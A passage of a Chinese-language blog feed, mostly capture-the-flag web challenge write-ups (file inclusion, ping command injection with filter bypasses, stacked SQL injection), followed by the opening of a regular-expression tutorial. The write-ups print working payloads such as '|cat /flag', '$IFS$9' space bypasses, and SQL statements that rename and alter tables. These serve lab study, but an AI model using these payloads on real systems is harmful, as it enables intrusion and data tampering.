    <summary type="html">&lt;p&gt;web25&lt;/p&gt;
&lt;h1 id=&quot;web26（伪造Referer）&quot;&gt;&lt;a href=&quot;#web26（伪造Referer）&quot; class=&quot;headerlink&quot; title=&quot;web26（伪造Referer）&quot;&gt;&lt;/a&gt;web26（伪造Referer）&lt;/h1&gt;&lt;p&gt;&lt;</summary>
      
    
    
    
    
    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf</title>
    <link href="http://example.com/2021/04/05/buuctf1/"/>
    <id>http://example.com/2021/04/05/buuctf1/</id>
    <published>2021-04-05T12:29:14.000Z</published>
    <updated>2021-04-15T10:06:41.628Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>点开容器，发现<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\1.png" alt="1"></p><p>点击<code>tips</code><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\2.png" alt="2"></p><p>发现是用文件包含的方式打开flag.php文件</p><p>之前刷题有做过用php://filter读取文件源码，这题试一下</p><p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\3.png" alt="3"></p><p>用base64-decode</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">&quot;php://input&quot;</span>) || stristr($file,<span class="string">&quot;zip://&quot;</span>) || stristr($file,<span class="string">&quot;phar://&quot;</span>) || stristr($file,<span class="string">&quot;data:&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php里没内容，看一下flag.php里的</p><p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\4.png" alt="4"></p><p>用base64-decode</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Can you find out the flag?&quot;</span>;</span><br><span class="line"><span class="comment">//flag&#123;ce69e052-72a5-4f31-b4f7-d618aa394082&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>点开容器，发现什么也没有，用御剑跑了一下，发现容易服务器崩，线程少又跑的慢，点击查看源码<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\5.png" alt="5"></p><p>点开箭头所指链接<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\6.png" alt="6"></p><p>点开箭头所指链接，发现会302跳转到end.php说明这里面有猫腻</p><p>burp抓包，发送到Repeater<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\7.png" alt="7"></p><p>访问secr3t.php，得一段代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>secret<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag">    <span class="attr">highlight_file</span>(<span class="attr">__FILE__</span>);</span></span><br><span class="line"><span class="tag">    <span class="attr">error_reporting</span>(<span class="attr">0</span>);</span></span><br><span class="line"><span class="tag">    $<span class="attr">file</span>=<span class="string">$_GET[</span>&#x27;<span class="attr">file</span>&#x27;];</span></span><br><span class="line"><span class="tag">    <span class="attr">if</span>(<span class="attr">strstr</span>($<span class="attr">file</span>,&quot;<span class="attr">..</span>/&quot;)||<span class="attr">stristr</span>($<span class="attr">file</span>, &quot;<span class="attr">tp</span>&quot;)||<span class="attr">stristr</span>($<span class="attr">file</span>,&quot;<span class="attr">input</span>&quot;)||<span class="attr">stristr</span>($<span class="attr">file</span>,&quot;<span class="attr">data</span>&quot;))&#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">echo</span> &quot;<span class="attr">Oh</span> <span class="attr">no</span>!&quot;;</span></span><br><span class="line"><span class="tag">        <span class="attr">exit</span>();</span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">    <span class="attr">include</span>($<span class="attr">file</span>); </span></span><br><span class="line"><span class="tag">//<span class="attr">flag</span>放在了<span class="attr">flag.php</span>里</span></span><br><span class="line"><span class="tag">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里进行下一步的时候我放了一个错误，我知道要用php://filter读取flag文件，但是错误的在index.php后传参的，</p><p>也就是：<code>http://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/?file=php://filter/convert.base64-encode/resource=flag.php </code>这样是错误的，因为index.php没有文件包含，</p><p>因此我们要改成：<code>http://c76e7818-4c78-4212-841b-f65037874e73.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php </code></p><p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\8.png" alt="8"></p><p>对箭号所指的字符串base64解码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">            echo &quot;æå°±å¨è¿é&quot;;</span><br><span class="line">            $flag &#x3D; &#39;flag&#123;c2a2c0e2-6076-4c2a-a387-f45b291c0978&#125;&#39;;</span><br><span class="line">            $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>得flag</p><h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>点开容器，发现一个ping窗口</p><p>ping一下容器地址<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\9.png" alt="9"></p><p>回顾一下系统命令的<code>管道符</code></p><p>1、<code>|</code>（就是按位或），直接执行|后面的语句 </p><p>2、<code>||</code>（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句 </p><p>3、<code>&amp;</code>（就是按位与），&amp;前面和后面命令都要执行，无论前面真假 4、<code>&amp;&amp;</code>（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令 </p><p>5、<code>; </code>前后都执行，无论前面真假，同&amp;，（linux也有）</p><p>ping: <code>f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls</code>——查看当前目录下的文件</p><p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\9.png" alt="9"></p><p>看来flag不在当前目录下</p><p>ping: <code>f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn |ls /</code>——查看根目录下的文件</p><p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\10.png" alt="10"></p><p>我们看到在根目录下存在一个名为flag的文件</p><p>ping：<code>f91eb079-6b2c-4052-8575-0021fe980c34.node3.buuoj.cn | cat /flag</code></p><p>得flag</p><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>点开容器</p><p><strong>直接开始ping</strong></p><p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\11.png" alt="11"></p><p><strong>发现不能payload里面不能有空格</strong><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\12.png" alt="12"></p><p><strong>补充一个知识点（命令执行空格绕过）</strong>：</p><p><code> &lt;</code> <code>&lt;&gt;</code> <code>&gt;</code> 重定向符<br> <code>%09</code>(需要php环境)<br> <code>$&#123;IFS&#125; </code><br> <code>$IFS$9</code><br> <code>&#123;cat,flag.php&#125;</code>  //用逗号实现了空格功能<br> <code>%20 </code></p><p><strong>那么我们尝试用重定向符绕过</strong><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\13.png" alt="13"></p><p>发现部分符号也被禁用了，</p><p>那么我们尝试用<code>$IFS$9</code>绕过，绕过成功，尝试cat flag<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\14.png" alt="14"></p><p>发现flag都被禁了，那我们cat index.php，得一段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以看到它禁用了很多的符号，这边要注意它严格过滤了flag——只要字符串中有按顺序存在<code>f</code> <code>l</code> <code>a</code> <code>g</code>就会被警告</p><p><strong>法1</strong>：由于存在shell_exec，我们可以尝试设参，如构造payload：<code>?ip=127.0.0.1;m=ag;n=fl;cat$IFS$9$n$m.php</code></p><p>这句话其实在终端就执行了两句话，一个是ping端口127.0.0.1，另一个是执行cat flag.php文件。中间两句是设置变量赋值。</p><p><strong>法2：</strong>内联执行</p><p>反引号在linux中作为内联执行，执行输出结果。也就是说</p><p> cat  ```ls` ``——先执行ls，输出 index.php 和 flag.php 。然后再执行 cat index.php;cat flag.php</p><p>这样查看返回页面的源码，得：<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\15.png" alt="15"></p><p>参考：</p><p>命令执行绕过：<a href="https://www.dazhuanlan.com/2019/12/09/5dee4883dad99/">https://www.dazhuanlan.com/2019/12/09/5dee4883dad99/</a></p><p><a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a></p><p>wp：<a href="https://blog.csdn.net/vanarrow/article/details/108295481">https://blog.csdn.net/vanarrow/article/details/108295481</a></p><p><a href="https://blog.csdn.net/qq_46184013/article/details/107061110?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.control&amp;dist_request_id=1328767.72324.16177154446992417&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.control">https://blog.csdn.net/qq_46184013/article/details/107061110?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control&amp;dist_request_id=1328767.72324.16177154446992417&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control</a></p><h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p>点开容器，发现直接给了我们一句话木马</p><p>我们用蚁剑连接，密码Syc</p><p>点击虚拟终端，<code>cat /flag</code><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\16.png" alt="16"></p><h1 id="强网杯-2019-随便注：（sql堆叠注入-数据库语句的使用）"><a href="#强网杯-2019-随便注：（sql堆叠注入-数据库语句的使用）" class="headerlink" title="[强网杯 2019]随便注：（sql堆叠注入+数据库语句的使用）"></a>[强网杯 2019]随便注：（sql堆叠注入+数据库语句的使用）</h1><p>点开容器<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\17.png" alt="17"></p><p>是一道sql注入题，先拿sqlmap跑一下，发现跑不出来。那就手工注入吧</p><p><strong>猜注入类型：</strong><code>0&#39; or 1=1#</code>  查询有结果<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\22.png" alt="22"></p><p>​                       <code>0&#39; or 1=2#</code>查询无结果</p><p><strong>猜字段：</strong><code>1&#39; order by 2# </code>     查询有结果</p><p>​               <code>1&#39; order by 3# </code>  查询无结果</p><p><strong>查看返回值：</strong><code>1&#39; union select 1,2#   </code><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\18.png" alt="18"></p><p>发现它使用正则匹配过滤掉了很多词，尝试一下堆叠注入。</p><p><strong>爆库：</strong>payload：<code>1&#39;;show databases#</code><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\19.png" alt="19"></p><p><strong>爆表：</strong>payload：<code>1&#39;;show tables#</code>  </p><p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\20.png" alt="20"></p><p>这里其实有个疑惑，就是我们查表没指明库，不应该跳出所有的表吗？但是他跳出来的是supersqli库里的表？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p><strong>爆列：</strong>payload：1’; show columns from <code>`1919810931114514`</code>#</p><p>sp:当字符串为表名，引用时要加反单引号<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\21.png" alt="21"></p><p><code>1919810931114514</code>表中只有flag一列，由此看来，<code>1919810931114514</code>不是默认表，访问一下<code>words</code>表——<code>1&#39;; show columns from words#</code><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\23.png" alt="23"></p><p>words表中含有data和id两个列。那么我们可以猜测数据库中的查询语句可能是<code>select id,data from words where id=</code></p><p>而我们的目标是获取列flag的值 </p><p><strong>法1：</strong>由于我们看到数据库默认的表是words，那么我们可以尝试改造<code>`1919810931114514 `</code>——将words表名改为words1，<code>1919810931114514</code>改为words，然后将列名flag改为id，最后在构造<code>0&#39; or 1=1#</code>即可</p><p>payload：<code>1&#39;;rename table words to words1;rename  table </code> <code> `1919810931114514`</code>  <code>to words;alter table words change flag id varchar(100);desc words#</code><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\24.png" alt="24"></p><p>我们看到原列名flag被改为了id，然后payload:<code>0&#39; or 1=1#</code><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\25.png" alt="25"></p><p><strong>法2：</strong></p><p><strong>MySQL数据库中还可以使用handler查询内容：</strong></p><p><strong>HANDLER table_name OPEN</strong>——打开一张表，无返回结果，<br><strong>HANDLER table_name READ FIRST</strong>——获取数据表第一行，通过将 READ FIRST改成READ NEXT依次获取其它行。有点类似于指针。<br><strong>HANDLER table_name CLOSE</strong>——来关闭打开的表。</p><p><strong>索引去查看的话要按上述一定的顺序，获取表中的数据：</strong></p><p><strong>HANDLER table_name READ index_name FIRST</strong>——获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</p><p><strong>索引列指定一个值，可以指定从哪一行开始：</strong></p><p><strong>HANDLER table_name READ index_name = value</strong>——指定从哪一行开始，通过NEXT继续浏览。</p><p>因此，我们构造payload：0’;handler  <code>`1919810931114514`</code>  open;handler <code>`1919810931114514`</code> read first#</p><p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\25.png" alt="25"></p><h1 id="SUCTF-2019-EasySQL：（sql堆叠注入）"><a href="#SUCTF-2019-EasySQL：（sql堆叠注入）" class="headerlink" title="[SUCTF 2019]EasySQL：（sql堆叠注入）"></a>[SUCTF 2019]EasySQL：（sql堆叠注入）</h1><p>一道post型sql注入题，sqlmap跑一下，发现跑不出来</p><p><strong>手工注入：</strong></p><p>1’  没有回显，可能屏蔽了回显报错，那么报错注入肯定不可能了</p><p>1’ or 1=1#<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\26.png" alt="26"></p><p>1‘ and 1=1#也一样，应该是<code>and和or</code>被过滤了</p><p>尝试联合注入：1’ union select 1,2#<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\26.png" alt="26"></p><p>查询框中单独输入select没有回显，输入union<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\26.png" alt="26"></p><p>看来union被过滤了，尝试盲注，先输一个sleep，同样不让，那么盲注也不行了</p><p>试试堆叠注入：</p><p>试了半天的1’;show databases#都没回显，然后payload改成1;show databases#<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\27.png" alt="27"></p><p>才发现这题是数字型注入</p><p>1;show tables;#<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\28.png" alt="28"></p><p>1;desc flag#<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\26.png" alt="26"></p><p>刚开始我还以为他过滤了desc，结果单输flag发现原来是过滤了flag</p><p><strong>那么做到现在我们先整理一下思路——</strong></p><p>1.当我们输入任意数字，回显都是1<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\29.png" alt="29"></p><p>   而当输入非数字内容时，则无回显</p><p>2.由于过滤了，那么查询语句中肯定有固定的Flag</p><p>初步猜测大致为： select   $query   xxx    from Flag</p><p>3.尝试用逗号隔开查询列数</p><p>输入10,2<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\30.png" alt="30"></p><p>输入 10,8,6<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\31.png" alt="31"></p><p>我们发现我们输入的最后一个数返回的本应该是其本身，但是这里无论输入什么返回都是1</p><p>于是我们猜测：select   $query  ||1  from Flag</p><p>我们知道select  *from  Flag是获取Flag的所有内容</p><p>那么此处我们可以构造payload：$query=*,1  （代入查询语句中就是：select   *,1 ||1  from Flag</p><p>等价于：select   *from Flag）</p><p>最终得：</p><p><img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\32.png" alt="32"></p><p>这边有一点注意：<img src="/2021/04/05/buuctf1/Users/Lenovo\Desktop\blog\hexo\source_posts\buuctf\33.png" alt="33"></p><p>这也是为什么上面第3点为什么我们输入的前几位都是返回其本身</p><p>其实还有一种，但是我感觉更麻烦，留一个payload吧：1;set sql_mode=pipes_as_concat; select 1</p><p>参考博客：<code>https://blog.csdn.net/ratear/article/details/109560061</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ACTF2020-新生赛-Include&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-Include&quot; class=&quot;headerlink&quot; title=&quot;[ACTF2020 新生赛]Include&quot;&gt;&lt;/a&gt;[ACTF2020 新生赛]Include&lt;/h1</summary>
      
    
    
    
    
    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>正则匹配</title>
    <link href="http://example.com/2021/04/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://example.com/2021/04/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2021-04-04T08:04:04.000Z</published>
    <updated>2021-04-04T10:09:39.755Z</updated>
    
    <content type="html"><![CDATA[<h4 id="正则表达式："><a href="#正则表达式：" class="headerlink" title="正则表达式："></a>正则表达式：</h4><p>描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p><ul><li><strong>正则表达式常用修饰符：</strong></li></ul><table><thead><tr><th align="left">修饰符</th><th align="left">含义</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><strong>i</strong></td><td align="left">ignore - 不区分大小写</td><td align="left">将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</td></tr><tr><td align="left">g</td><td align="left">global - 全局匹配</td><td align="left">查找所有的匹配项。</td></tr><tr><td align="left">m</td><td align="left">multi line - 多行匹配</td><td align="left">使边界字符 <strong>^</strong> 和 <strong>$</strong> 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。</td></tr><tr><td align="left">s</td><td align="left">特殊字符圆点 <strong>.</strong> 中包含换行符 <strong>\n</strong></td><td align="left">默认情况下的圆点 <strong>.</strong> 是 匹配除换行符 <strong>\n</strong> 之外的任何字符，加上 <strong>s</strong> 修饰符之后, <strong>.</strong> 中包含换行符 \n。</td></tr></tbody></table><ul><li><p><strong>常见的正则匹配字符:</strong></p><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>\</td><td><strong>将下一个字符标记为一个特殊字符</strong>、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\\‘ 匹配 “\“ 而 “\(“ 则匹配 “(“。</td></tr><tr><td>^</td><td><strong>匹配输入字符串的开始位置。</strong>如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。</td></tr><tr><td>$</td><td><strong>匹配输入字符串的结束位置。</strong>如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。</td></tr><tr><td>\d</td><td>匹配一个数字字符。等价于 [0-9]。</td></tr><tr><td>\d+</td><td>匹配多个数字。</td></tr><tr><td>\D</td><td>匹配一个非数字字符。等价于 [ ^0-9]。</td></tr><tr><td>x|y</td><td>匹配 x 或 y。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。</td></tr><tr><td>[xyz]</td><td>字符集合。<strong>匹配所包含的任意一个字符</strong>。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。</td></tr><tr><td>[^xyz]</td><td>负值字符集合。<strong>匹配未包含的任意字符</strong>。例如， ‘[ ^abc]’ 可以匹配 “plain” 中的’p’、’l’、’i’、’n’。</td></tr><tr><td>[a-z]</td><td>字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。</td></tr><tr><td>[^a-z]</td><td>负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[ ^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。</td></tr><tr><td>*</td><td>匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td></tr><tr><td>+</td><td>匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td></tr><tr><td>{n}</td><td>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td></tr><tr><td>{n,}</td><td>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td></tr><tr><td>{n,m}</td><td>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 